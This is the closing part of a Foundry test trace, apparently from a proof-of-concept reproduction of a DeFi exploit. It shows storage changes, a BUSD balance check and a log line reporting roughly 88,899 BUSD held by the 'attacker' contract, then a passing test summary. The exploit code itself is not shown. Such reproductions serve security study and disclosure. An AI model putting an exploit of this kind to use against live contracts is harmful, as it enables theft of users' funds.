    │   │   │   @ 8: 0x63fc513e000000001410f785b9990f4d0d670000000089ac00763cb6c7034778 → 0x63fc5c9400000000013db1aa6b406a1ba28200000008b75356d13a641ea19aae
    │   │   │   @ 9: 0x0000000000000000000000000000050946d538df3d575617557e39b247a57733 → 0x00000000000000000000000000000509487c3388c335f07e91e6ea147dcd3803
    │   │   └─ ← [Stop]
    │   └─ ← [Return] [9886999877471233034310454 [9.886e24], 88899893394357481466597 [8.889e22]]
    ├─ [531] BUSD::balanceOf(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 88899893394357481466597 [8.889e22]
    ├─ [0] console::log("attacker BUSD Balalnce", 88899 [8.889e4]) [staticcall]
    │   └─ ← [Stop]
    ├─  storage changes:
    │   @ 0xb96dca3b8cbb86adb790f0cfc85b2feddac1a719eb144a7109c9141980a9d548: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
    │   @ 13: 0 → 1
    │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
    │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0 → 0x000000000000000000000000000000000000000000082da7565afdad579e5336
    │   @ 12: 0 → 1
    │   @ 0xe0eba829a1ca25faf244a5bd1aca80e35c2f62a4aefd737dac41a0ab6a2cbd49: 0 → 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96
    │   @ 0xe0eba829a1ca25faf244a5bd1aca80e35c2f62a4aefd737dac41a0ab6a2cbd4c: 0 → 1
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 15.90s (14.49s CPU time)

Ran 2 test suites in 17.12s (16.50s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
